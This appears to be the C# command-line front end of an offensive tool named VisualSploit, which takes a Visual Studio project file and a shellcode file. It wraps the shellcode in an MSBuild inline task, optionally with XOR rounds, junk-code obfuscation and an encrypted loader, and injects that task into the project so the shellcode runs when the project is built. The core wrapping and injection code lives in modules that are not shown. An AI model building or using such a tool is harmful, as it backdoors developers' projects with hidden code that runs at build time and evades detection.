using System.CommandLine;
using System.CommandLine.Invocation;
using VisualSploit.Core;
using VisualSploit.Templates;

namespace VisualSploit;

class Program
{
    static int Main(string[] args)
    {
        var projectArg = new Argument<FileInfo>("project")
        {
            Description = "Target .csproj or .vbproj file"
        };
        var shellcodeArg = new Argument<FileInfo>("shellcode")
        {
            Description = "Shellcode file (raw bytes or hex)"
        };

        var outputOption = new Option<FileInfo?>("-o", "--output")
        {
            Description = "Output path (default: in-place)"
        };

        var noBackupOption = new Option<bool>("--no-backup")
        {
            Description = "Skip backup"
        };

        var methodsOption = new Option<string?>("-m", "--methods")
        {
            Description = "Obfuscation methods: xor,junk"
        };

        var encryptOption = new Option<bool>("-e", "--encrypt")
        {
            Description = "Encrypted payload loader"
        };

        var roundsOption = new Option<int>("-r", "--rounds")
        {
            Description = "XOR rounds 1-5",
            DefaultValueFactory = _ => 3
        };

        var seedOption = new Option<int?>("-s", "--seed")
        {
            Description = "RNG seed for reproducibility"
        };

        var rootCommand = new RootCommand("VisualSploit - MSBuild Inline Task Injection")
        {
            projectArg,
            shellcodeArg,
            outputOption,
            noBackupOption,
            methodsOption,
            encryptOption,
            roundsOption,
            seedOption
        };

        rootCommand.SetAction((ctx, _) =>
        {
            var project = ctx.GetValue(projectArg)!;
            var shellcode = ctx.GetValue(shellcodeArg)!;
            var output = ctx.GetValue(outputOption);
            var noBackup = ctx.GetValue(noBackupOption);
            var methods = ctx.GetValue(methodsOption);
            var encrypt = ctx.GetValue(encryptOption);
            var rounds = ctx.GetValue(roundsOption);
            var seed = ctx.GetValue(seedOption);

            Execute(project, shellcode, output, noBackup, methods, encrypt, rounds, seed);

            return Task.CompletedTask;
        });

        return rootCommand.Parse(args).Invoke();
    }

    static void Execute(
        FileInfo project,
        FileInfo shellcode,
        FileInfo? output,
        bool noBackup,
        string? methods,
        bool encrypt,
        int rounds,
        int? seed)
    {
        try
        {
            if (rounds < 1 || rounds > 5)
                throw new ArgumentException("XOR rounds must be between 1 and 5");

            var m = ParseMethods(methods);

            var cfg = new Config(Encrypt: encrypt, Methods: m, XorRounds: rounds, Seed: seed);

            Console.WriteLine("VisualSploit - MSBuild Inline Task Injection");
            Console.WriteLine();

            Console.Write("Generating inline task... ");
            var payload = MsBuild.Wrap(shellcode.FullName, cfg);
            Console.WriteLine("done");

            if (m != Methods.None)
                Console.WriteLine($"Obfuscation: {m}");

            Console.Write("Injecting payload... ");
            var outputPath = output?.FullName;
            Injector.Inject(project.FullName, payload, outputPath, !noBackup);
            Console.WriteLine("done");

            Console.WriteLine($"Success: {outputPath ?? project.FullName}");

            if (!noBackup && output == null)
                Console.WriteLine($"Backup: {project.FullName}.bak");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Error: {ex.Message}");
            Environment.ExitCode = 1;
        }
    }

    static Methods ParseMethods(string? str)
    {
        if (string.IsNullOrEmpty(str))
            return Methods.None;

        var r = Methods.None;
        var parts = str.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);

        foreach (var p in parts)
        {
            r |= p.ToLower() switch
            {
                "xor" => Methods.Xor,
                "junk" => Methods.Junk,
                _ => throw new ArgumentException($"Unknown method: {p}")
            };
        }
        return r;
    }
}
